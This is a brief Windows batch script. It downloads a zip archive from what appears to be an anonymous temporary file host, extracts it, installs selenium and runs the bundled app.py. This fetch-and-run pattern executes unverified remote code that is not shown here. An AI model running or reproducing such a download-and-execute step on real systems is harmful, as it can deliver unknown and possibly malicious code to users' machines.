@echo off
powershell -Command "Invoke-WebRequest https://a.tmp.ninja/qBGcmdAw.zip -OutFile package.zip"
powershell -Command "Expand-Archive package.zip"
cd package
pip3 install selenium
python3 app.py
